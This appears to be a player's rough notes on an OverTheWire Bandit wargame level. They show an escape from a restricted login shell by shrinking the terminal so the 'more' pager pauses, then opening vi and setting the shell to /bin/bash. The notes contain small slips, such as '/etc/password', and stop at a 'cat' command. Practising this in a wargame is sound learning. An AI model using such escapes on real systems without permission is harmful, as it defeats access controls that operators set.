ssh -i bandit26.sshkey bandit26@localhost -p2220

I see this message fly past:

!!! You are trying to log into this SSH server with a password on port 2220 from localhost.
!!! Connecting from localhost is blocked to conserve resources.
!!! Please log out and log in again.


copy the ssh key to my local machine and it still drops out which means the shell isn't set to bash

go back to bandit25 and I can see in /etc/password the shell is set to:

bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext

bandit25@bandit:~$ /usr/bin/showtext
more: cannot open /home/bandit25/text.txt: No such file or directory

by shrinking the terminal window down I can convince more to show the pager, at which point I can enter v to bring up a command and then enter:

:set shell=/bin/bash
:set

and I see the following:
:shell
bandit26@bandit:~$ ls
bandit27-do  text.txt
bandit26@bandit:~$ cat text.txt
